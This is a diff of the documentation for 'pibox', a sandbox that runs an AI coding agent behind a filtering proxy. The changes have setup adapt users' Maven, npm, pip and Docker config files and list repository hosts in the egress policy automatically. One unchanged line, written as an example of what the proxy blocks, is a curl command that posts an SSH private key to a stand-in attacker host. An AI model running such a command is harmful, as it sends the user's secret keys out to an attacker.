@@ -541,8 +541,8 @@ Requests the policy refused show up as already answered (403/405) and never wait
 **Things that behave differently in this sandbox:**
 - Only plain HTTP requests leave the sandbox: `curl http://…` works, `curl https://…` is refused
   (§4.6). `web_fetch` converts the URL for you.
-- Dependencies, packages and images come from your repository with GET and work. Keep it in
-  `egress.no_approval`, otherwise you'll approve hundreds of requests. `npm audit`, `mvn deploy`,
+- Dependencies, packages and images come from your repository with GET and work. `pibox setup`
+  puts its host into `egress.no_approval` (§8.9), so you don't approve hundreds of requests. `npm audit`, `mvn deploy`,
   `docker push` (POST/PUT) are blocked.
 - `git clone` fails: git's HTTP protocol uses POST (and `https://` tunnels are refused anyway). Clone on the Mac into
   `~/Projects`, and the agent works on the mounted copy.
@@ -614,8 +614,8 @@ Three containers run inside the Colima VM, four with the agent's own Docker engi
   encrypted tunnel (`CONNECT docs.python.org:443`). Nobody could see the method inside it, so the
   policy refuses it with a message telling the agent to use `http://` URLs (§4.6).
 - *The agent runs `npm install`.* npm asks `repository.npm` (your mirror's `http://` address), through
-  the same proxy. The mirror is listed in `egress.allow_private` (it's on an internal address) and in
-  `egress.no_approval`, so the downloads pass without hundreds of prompts. They are still GET-only.
+  the same proxy. `pibox setup` added the mirror's host to `egress.allow_private` (it's on an internal
+  address) and `egress.no_approval` (§8.9), so the downloads pass without hundreds of prompts. They are still GET-only.
 - *The agent runs `curl -X POST -d @~/.ssh/id_rsa http://evil.example`.* The file doesn't exist in
   the container, and even if it did, the proxy answers `405 method not allowed` at once. The
   request never leaves the proxy, and never reaches your approval queue.
@@ -803,8 +803,8 @@ Details that matter:
   `docker compose exec proxy tail -f /home/mitmproxy/.mitmproxy/egress.log`.
 
 The settings, the `egress` section of `config.yaml` (the addon reads them as `EGRESS_*` variables):
-- `egress.allow_private`: hosts on internal addresses that are still allowed, typically your package mirror;
-- `egress.no_approval`: hosts that don't wait for you: package registries. GET-only still applies;
+- `egress.allow_private`: hosts on internal addresses that are still allowed; your repositories are added by `pibox setup` (§8.9);
+- `egress.no_approval`: hosts that don't wait for you; your repositories are added by `pibox setup`. GET-only still applies;
 - `egress.allow_only`: only these domains and their subdomains. Use it for unattended runs, where
   you won't be approving requests;
 - `egress.deny`: always refused, for example paste and file-sharing sites;
@@ -933,24 +933,48 @@ root on the VM. The agent gets its own engine instead (§8.10).
 
 ### 8.9 Build tools and your artifact repository
 
-**What:** `pibox up` and `pibox run` write these files into `~/.pi-sandbox/generated/c`
+**What:** `pibox setup` writes these files into `~/.pi-sandbox/generated/c`
 from `config.yaml`, and `compose.yaml` mounts them read-only where each tool looks for its settings:
 
 | Generated file | Mounted as | What it sets |
 |---|---|---|
-| `settings.xml` | `~/.m2/settings.xml` | One mirror (`mirrorOf *`) = `repository.maven`, the credentials for it, the filtering proxy |
+| `settings.xml` | `~/.m2/settings.xml` | Your `repository.maven_settings`, adapted (below); or one mirror (`mirrorOf *`) = `repository.maven` with its credentials. The filtering proxy |
 | `toolchains.xml` | `~/.m2/toolchains.xml` | JDK 17, 21 and 25 for projects that use Maven toolchains |
 | `gradle.properties` | `~/.gradle/gradle.properties` | The proxy for Gradle; the JDKs for Gradle toolchains, no JDK downloads |
 | `init.gradle` | `~/.gradle/init.d/pi-sandbox.gradle` | Replaces every remote repository of a build (plugins, buildscript, settings, projects) by your mirror |
-| `npmrc` | `NPM_CONFIG_USERCONFIG` | Registry, credentials (`_auth`), proxy; no audit, no update checks |
-| `pip.conf` | `PIP_CONFIG_FILE` | Index with credentials, trusted host, proxy |
+| `npmrc` | `NPM_CONFIG_USERCONFIG` | Your `repository.npmrc`, adapted; or `repository.npm` with credentials (`_auth`). The proxy; no audit, no update checks |
+| `pip.conf` | `PIP_CONFIG_FILE` | Your `repository.pip_conf`, adapted; or `repository.pip` with credentials and its trusted host. The proxy |
 | `docker-config.json` | `~/.docker/config.json` | Login for `repository.docker_registry`; the proxy that `docker run`, `docker compose` and `docker build` give to the containers they start |
-| `daemon.json` | `/etc/docker/daemon.json` of the `docker` service | The agent's engine: your registry over HTTP, the Docker Hub mirror, the proxy, the address pool (§8.10) |
+| `daemon.json` | `/etc/docker/daemon.json` of the `docker` service | The agent's engine: your `repository.docker_daemon`, adapted, or your registry over HTTP and the Docker Hub mirror; the proxy, the address pool (§8.10) |
 
 **Why:** the agent has no route to Maven Central, npmjs.com, PyPI or Docker Hub, and HTTPS tunnels
 are refused (§4.6). Every tool must therefore download from your repository, over plain HTTP,
 through the proxy. Configuring each tool here means projects need no changes: a `pom.xml` that
 lists five repositories still resolves everything from the one mirror.
+
+**Your own files.** With several repositories, mirrors and logins, give `pibox` the files you
+already have instead of the URLs: `repository.maven_settings` (e.g. `~/.m2/settings.xml`),
+`repository.npmrc` (`~/.npmrc`), `repository.pip_conf` (e.g. the `pip.conf` of Artifactory's "Set Me
+Up"), `repository.docker_daemon` (a `daemon.json`). `pibox setup` copies
+them (the VM doesn't see your home folder) and changes only what can't work in the sandbox:
+
+| File | Changed in the copy |
+|---|---|
+| `settings.xml` | comments removed; `<proxies>` replaced by the filtering proxy; `<localRepository>` and `<offline>` dropped (Mac paths); `https://` in `<url>` becomes `http://` |
+| `.npmrc` | `proxy`, `https-proxy`, `noproxy`, `cafile`, `ca`, `strict-ssl`, `prefix`, `cache` and similar lines dropped; `https://` registries (scoped ones too) become `http://`; the filtering proxy added. Its `registry=` is also used to install Pi into the image |
+| `pip.conf` | `proxy`, `trusted-host`, `cert`, `client-cert`, `cache-dir`, `target`, `prefix`, `user` and similar keys dropped (in every section, with their continuation lines); `https://` becomes `http://`; the filtering proxy and a `trusted-host` with every index host added to `[global]` (pip refuses plain HTTP from untrusted hosts) |
+| `daemon.json` | `hosts`, `tls*`, `data-root`, `exec-root`, `pidfile` dropped; `proxies` set to the filtering proxy; `https://` mirrors become `http://` and are added to `insecure-registries`; the address pool and snapshotter set if missing |
+
+Things that can't be fixed in a copy are reported: encrypted Maven passwords (`{…}`: the sandbox has
+no `settings-security.xml`) and references to environment variables of your Mac (`${env.…}`,
+`${…}`). `pibox up`, `run` and `verify` refuse to start when one of these files changed after the
+last `pibox setup`. Gradle doesn't read `settings.xml`: it still uses `repository.maven` as its
+mirror (or, if that's empty, the repositories of the build itself).
+
+**Repository hosts in the egress policy.** `pibox setup` collects every repository host from the
+generated files (`<url>`s, registries, mirrors, `repository.*` URLs) and adds it to
+`egress.no_approval` and `egress.allow_private`, its port to `egress.ports`, and prints the list.
+Public default registries (registry.npmjs.org, pypi.org) are not added.
 
 **How it works, per tool:**
 - **Maven** reads `~/.m2/settings.xml` by itself, also for `./mvnw`. The Maven wrapper downloads
@@ -964,12 +988,11 @@ lists five repositories still resolves everything from the one mirror.
   sandbox can't reach. Use the installed `gradle`, or point `distributionUrl` at your repository's copy.
 - **npm, pnpm, yarn**: `.npmrc` for npm; corepack downloads pnpm and yarn from `repository.npm`.
 - **pip**: `pip.conf`, inside virtual environments too.
-- **Credentials**: `repository.user` and `repository.token` go into these files, so the agent can
-  read them. Use a token that can only read.
-- **Your repository must be reachable through the proxy**: put its host into `egress.allow_private`
-  (it has an internal address) and `egress.no_approval` (no prompt per download), into
-  `network.upstream_no_proxy` if it is reached directly rather than through the proxy on your Mac, and its ports
-  into `egress.ports` if they aren't 80/443.
+- **Credentials**: `repository.user` and `repository.token`, and whatever your own files contain,
+  end up in these files, so the agent can read them. Use tokens that can only read.
+- **Your repositories must answer plain HTTP**: only `http://` passes the filter (§4.6). Their hosts
+  get into the egress lists by themselves (above); add a host to `network.upstream_no_proxy` if it
+  is reached directly rather than through the proxy on your Mac.
 - **Deploy, publish, push** (POST/PUT) are refused by the proxy: the agent builds and tests, you publish.
 
 ### 8.10 The agent's Docker engine
@@ -1175,13 +1198,13 @@ Repeat after upgrading macOS, Colima, Docker, mitmproxy or Pi. After the session
 | `apt-get update` fails during the build | Check `repository.apt_debian`/`repository.apt_security` in `config.yaml`: they replace `http://deb.debian.org/debian` and `…/debian-security` as whole URLs |
 | `docker compose` / `docker buildx`: unknown command | The CLI doesn't find Homebrew's plugins: `pibox init` adds `cliPluginsExtraDirs` to `~/.docker/config.json` (§6.1) |
 | Requests hang | They're waiting for approval: `pibox approve`. The journal (`pibox log`) shows `ASK` for them |
-| A package mirror or internal host gets `403 … private/internal address` | Add it to `egress.allow_private` (and to `egress.no_approval` for registries), then `pibox up` |
+| A package mirror or internal host gets `403 … private/internal address` | A repository from the `repository` section is added by itself (check `pibox setup`'s list). Any other host: add it to `egress.allow_private`, then `pibox setup` and `pibox up` |
 | The bridge or an image build should reach a host directly, not through the proxy on your Mac | Add it to `network.upstream_no_proxy`. The agent's own web traffic always goes through the filtering proxy |
 | `pibox run -p "…"` never finishes | It waits for stdin: add `</dev/null` |
 | `proxy` keeps restarting: `invalid width 0` or `usermod: invalid user ID` | Keep the `stty …` command and the `cap_add` list from §8.8 |
 | mitmproxy logs `AssertionError: Unexpected event type at TCPLayer.done` | Printed when the policy kills a raw TCP tunnel (`BLOCKED raw TCP` comes right after). The connection is closed as intended, so the message is harmless |
 | Node scripts can't reach the web (`EAI_AGAIN`) | Node's `fetch()` ignores proxy variables unless `NODE_USE_ENV_PROXY=1` is set (Node ≥ 24) |
-| `npm install` asks for approval hundreds of times | Add your mirror to `egress.no_approval` in `config.yaml`, then `pibox up` |
+| `npm install` asks for approval hundreds of times | The registry it uses isn't in `repository` (or your `npmrc`): add it there, then `pibox setup` and `pibox up` |
 | `git clone https://…` fails with 405 | Expected: git uses POST. Clone on the Mac |
 | Files written by the agent belong to a strange user | `pibox` detects your ids; if you set `mac.uid`/`mac.gid` in `config.yaml`, check them against `id -u`/`id -g`, then `pibox up` |
 | The Colima VM shows more than your three folders | The VM was created before `pibox setup` wrote its configuration: `pibox down --vm && pibox up`. If the profile was made by hand, delete it (`colima delete <vm.profile>`) and run `pibox up` |
